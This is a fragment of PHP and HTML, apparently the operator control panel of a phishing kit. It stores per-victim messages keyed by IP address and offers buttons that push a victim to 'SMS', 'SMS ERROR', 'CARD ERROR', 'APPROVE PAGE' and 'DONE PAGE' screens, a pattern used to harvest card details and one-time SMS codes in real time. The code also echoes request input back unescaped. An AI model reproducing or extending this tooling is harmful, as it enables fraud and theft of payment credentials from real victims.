...
// Get the VIP IP from the URL parameter
$vip_ip = isset($_GET['vip']) ? $_GET['vip'] : '';
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['message1'], $_POST['message2']) && !empty($vip_ip)) {
    $message1 = $_POST['message1'];
    $message2 = $_POST['message2'];

    // Update or add messages for the given IP
    $data[$vip_ip] = ['message1' => $message1, 'message2' => $message2];

    // Save back to the file
    file_put_contents($file_path, json_encode($data));

    echo "Messages saved for VIP IP: $vip_ip";
}

// Get current messages for the VIP IP (if they exist)
$current_message1 = isset($data[$vip_ip]['message1']) ? $data[$vip_ip]['message1'] : '';
$current_message2 = isset($data[$vip_ip]['message2']) ? $data[$vip_ip]['message2'] : '';
...
<div class="content">
<button onclick="redirect(6)">SMS</button>
<button onclick="redirect(7)">SMS ERROR</button>
<button onclick="redirect(8)">CARD ERROR</button>
<button onclick="redirect(9)">APPROVE PAGE</button>
<button onclick="redirect(10)">APPROVE PAGE ERROR</button>

<button onclick="redirect(99)">DONE PAGE</button>
</div>
</div>
<div class="content">
...
<div class="content">
<button onclick="redirect(99)"> OFFICIAL WEBSITE <i class='fa-solid fa-arrow-right'></i> </button>
</div>
</div>
</div>
</div>
